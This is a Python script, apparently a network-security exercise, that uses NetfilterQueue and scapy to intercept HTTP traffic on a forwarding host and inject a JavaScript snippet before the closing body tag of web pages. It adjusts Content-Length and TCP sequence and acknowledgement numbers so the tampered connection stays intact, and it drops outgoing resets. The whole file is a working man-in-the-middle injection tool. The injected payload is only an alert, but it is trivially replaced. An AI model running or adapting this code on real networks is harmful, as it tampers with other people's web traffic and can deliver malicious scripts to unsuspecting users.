from netfilterqueue import NetfilterQueue
from scapy.all import *
import os
import traceback
import string

PROTO_TCP = 6
PORT_WWW_HTTP = 80
TCP_FIN = 0x01
TCP_SYN = 0x02
TCP_ACK = 0x10

SCRIPT = '<script>alert("PHP is the best language!");</script>'
SCRIPT_LEN = len(SCRIPT)

sessions = {}
conf.L3socket = L3RawSocket

def callback(pkt):
    modified = False
    try:
        data = IP(pkt.get_payload())
        if data.proto == PROTO_TCP and data.sport == PORT_WWW_HTTP: # incoming
            # data.show()
            S = (data.dst, data.dport)
            if S in sessions and data[TCP].flags == TCP_SYN | TCP_ACK:
                sessions[S]['seq_'] = data[TCP].seq
                sessions[S]['ack_'] = data[TCP].ack

            if S in sessions:
                print(data.summary(), data.seq - sessions[S]['seq_'], data.ack - sessions[S]['ack_'])
                if data[TCP].seq >= sessions[S]['threshold']:
                    data[TCP].seq += sessions[S]['offset']
                    print(f'modify seq, delta = {sessions[S]["offset"]}, modified results = ({data[TCP].seq - sessions[S]["seq_"]}, {data[TCP].ack - sessions[S]["ack_"]})')
                    modified = True

                raw = bytes(data[TCP].payload).decode('utf-8')
                loc = raw.find('</body>')
                if raw:
                    print('original data size', len(raw))
                if loc != -1: # didn't consider the case where '</body>' itself is a string, e.g., "var x = '</body>';".

                    # find the enclosing </body>
                    # should insert script before </body>
                    raw = raw[:loc] + SCRIPT + raw[loc:]
                    # raw = ' ' * len(raw)
                    sessions[S]['offset'] = SCRIPT_LEN
                    sessions[S]['threshold'] = data[TCP].seq + len(data[TCP].payload) + sessions[S]['offset']

                    print('forging fake packet')
                    data[TCP].payload = bytes(raw, 'utf-8')
                    modified = True

                    # forge a fake packet

                    # data[TCP].payload = bytes(('a fake packet!' + '!' * 1000)[:len(raw)], 'utf-8')
                    ## sessions[S]['offset'] = len(MARK)
                    # del data[TCP].chksum
                    # del data[IP].chksum
                    # # data.show2()
                    # send(data)
                    # pkt.drop()
                    # return
                elif raw.find('Content-Length: ') != -1:
                    loc = raw.find('Content-Length: ')
                    start = loc + 16
                    end = start
                    while end < len(raw) and raw[end].isdigit():
                        end += 1
                    length = str(int(raw[start:end]) + SCRIPT_LEN)
                    data[TCP].payload = bytes(raw[:start] + length + raw[end:], 'utf-8')
                    modified = True

            if data[TCP].flags & TCP_FIN and S in sessions:
                sessions[S]['FIN_count'] += 1
                # if sessions[S]['FIN_count'] >= 2:
                #    del sessions[S]

        elif data.proto == PROTO_TCP and data.dport == PORT_WWW_HTTP: # outgoing, client -> server
            # data.show()
            S = (data.src, data.sport)
            if S in sessions:
                print(data.summary(), data.seq - sessions[S]['ack_'], data.ack - sessions[S]['seq_'])
            if data[TCP].flags == TCP_SYN:
                sessions[S] = {'offset': 0, 'FIN_count': 0, 'threshold': 10**10, 'seq_': 0, 'ack_': 0}
            if S in sessions:
                if data[TCP].ack >= sessions[S]['threshold']:
                    data[TCP].ack -= sessions[S]['offset']
                    print(f'modify ack, delta = {-sessions[S]["offset"]}, modified results = ({data[TCP].seq- sessions[S]["ack_"]}, {data[TCP].ack - sessions[S]["seq_"]})')
                    modified = True
            
    except:
        print('error')
        traceback.print_exc()
    
    if modified:
        del data[TCP].chksum
        del data.len
        del data[IP].chksum
        pkt.set_payload(bytes(data))
    pkt.accept()

def main():
    Qnum = 1
    rules = [
        f'iptables -I INPUT -j NFQUEUE --queue-num {Qnum} --queue-bypass',
        f'iptables -I OUTPUT -j NFQUEUE --queue-num {Qnum} --queue-bypass',
        f'iptables -I FORWARD -j NFQUEUE --queue-num {Qnum} --queue-bypass',
        f'iptables -I OUTPUT -p tcp --tcp-flags RST RST -j DROP',
    ]
    for rule in rules:
        print(f'setting rule: {rule}')
        os.system(rule)

    os.system("sysctl net.ipv4.ip_forward=1")

    q = NetfilterQueue()
    q.bind(Qnum, callback)
    try:
        q.run()
    except KeyboardInterrupt:
        pass
    q.unbind()
    os.system('iptables -F')
    os.system('iptables -X')

if __name__ == "__main__":
    main()
